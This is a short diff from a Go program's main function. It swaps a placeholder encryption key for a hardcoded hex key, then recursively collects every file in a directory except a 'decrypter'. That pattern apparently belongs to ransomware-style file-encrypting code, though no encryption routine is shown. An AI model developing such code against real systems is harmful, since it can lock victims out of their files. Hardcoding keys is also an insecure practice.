@@ -27,7 +27,7 @@ func main() {
 	//if err != nil {
 	//	panic(err)
 	//}
-	key := []byte("teste")
+	key := []byte("959148601e08d6cc80816964006a15ed54911fd32c3a77f7baaf5d74d4f895c0")
 	//use function mapfiles from explorer (gets every file recursive by decided dir except decrypter!)
 	files := explorer.MapFiles(Dir)
 
